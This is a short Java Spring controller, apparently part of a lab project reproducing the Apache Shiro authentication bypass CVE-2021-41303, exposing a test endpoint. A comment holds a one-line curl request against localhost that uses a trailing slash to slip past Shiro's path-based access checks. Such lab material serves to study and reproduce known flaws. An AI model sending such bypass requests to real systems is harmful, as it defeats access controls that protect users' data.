package me.threedr3am.bug.shiro.bypass.auth.controller;

import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RestController;

/**
 * CVE-2021-41303
 * curl http://127.0.0.1/bypass/threedr3am/index/
 *
 * @author threedr3am
 */
@RestController
public class BypassTestController {

    /**
     * @return
     */
    @RequestMapping(value = "/bypass/{id}/index", method = RequestMethod.GET)
    public String bypass(@PathVariable(name = "id") String id) {
        return "bypass1 -> " + id;
    }
}
